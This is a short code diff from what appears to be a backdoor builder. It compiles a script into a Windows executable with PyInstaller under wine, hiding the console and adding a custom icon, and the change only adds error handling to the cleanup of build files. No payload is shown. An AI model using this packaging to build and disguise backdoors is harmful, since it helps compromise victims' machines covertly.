@@ -44,7 +44,10 @@ class Builder:
 
     def compile(self):
         subprocess.call(["wine", self.path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", self.BACKDOOR_NAME+".py"])
-        os.remove(self.BACKDOOR_NAME+".py");os.remove(self.BACKDOOR_NAME+".spec")
+        try:
+            os.remove(self.BACKDOOR_NAME+".py");os.remove(self.BACKDOOR_NAME+".spec")
+        except FileNotFoundError:
+            pass
 
 print('''
 ▓█████▄  ██▓  ██████  ▄████▄  ▄▄▄█████▓ ▒█████   ██▓███   ██▓ ▄▄▄      
